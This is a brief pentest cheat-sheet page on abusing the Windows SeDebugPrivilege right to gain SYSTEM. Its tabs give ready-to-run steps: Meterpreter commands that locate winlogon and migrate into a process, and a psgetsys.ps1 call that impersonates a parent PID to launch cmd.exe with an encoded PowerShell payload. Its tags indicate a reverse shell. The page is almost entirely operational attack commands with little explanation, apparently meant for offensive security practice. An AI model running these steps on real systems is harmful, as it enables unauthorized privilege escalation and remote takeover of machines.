---
title: "SeDebugPrivilege"
date: 2024-8-2
tags: ["SeDebugPrivilege", "Windows", "Metasploit", "Reverse Shell"]
---

### Tools

{{< tab set1 tab1 >}}Metasploit{{< /tab >}}
{{< tab set1 tab2 >}}psgetsys.ps1{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# Inside meterpreter
ps winlogon
```

```console
# Explorer.exe is a good candidate
migrate <PID>
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
# Import module
. .\psgetsys.ps1
```

```console
ImpersonateFromParentPid -ppid <PID> -command "c:\windows\system32\cmd.exe" -cmdargs "/c <POWERSHELL_3_BASE64>"
```

<small>*Ref: [psgetsys](https://github.com/decoder-it/psgetsystem)*</small>

{{< /tabcontent >}}
